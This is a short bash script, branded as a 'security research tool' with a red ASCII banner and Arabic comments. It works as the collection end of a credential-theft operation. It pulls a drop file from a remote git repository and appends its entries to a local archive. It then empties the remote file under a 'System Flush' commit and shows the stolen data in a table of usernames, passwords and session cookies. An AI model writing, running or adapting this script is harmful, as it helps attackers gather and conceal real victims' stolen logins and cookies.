#!/bin/bash
# Security Research Tool - Crimson Edition

# تعريف الألوان
RED='\033[0;31m'
NC='\033[0m' # No Color

clear
# الشعار الكبير (ASCII Art) باللون الأحمر الدموي
echo -e "${RED}"
echo "██████╗  ██████╗ ██████╗ ██╗      ██████╗ ██╗  ██╗"
echo "██╔══██╗██╔═══██╗██╔══██╗██║     ██╔═══██╗╚██╗██╔╝"
echo "██████╔╝██║   ██║██████╔╝██║     ██║   ██║ ╚███╔╝ "
echo "██╔══██╗██║   ██║██╔══██╗██║     ██║   ██║ ██╔██╗ "
echo "██║  ██║╚██████╔╝██████╔╝███████╗╚██████╔╝██╔╝ ██╗"
echo "╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝"
echo "            BY: CHIEF OF CYBER SECURITY            "
echo -e "${NC}"

echo -e "${RED}[*] Connecting to Secure Cloud Vault...${NC}"
git pull origin main --quiet

if [ -s "vault.txt" ]; then
    cat vault.txt >> master_archive.txt
    echo -n "" > vault.txt
    git add vault.txt
    git commit -m "System Flush" --quiet
    git push origin main --quiet
    echo -e "${RED}[+] New Signals Captured & Cloud Flushed!${NC}"
else
    echo -e "${RED}[!] Waiting for New Targets...${NC}"
fi

echo -e "\n${RED}================================================================${NC}"
echo -e "${RED}          MASTER ARCHIVE (USER | PASS | COOKIE)                 ${NC}"
echo -e "${RED}================================================================${NC}"
printf "${RED}%-18s | %-15s | %-15s | %-s${NC}\n" "TIME" "USER" "PASS" "COOKIE"
echo -e "${RED}----------------------------------------------------------------${NC}"
column -t -s "|" master_archive.txt
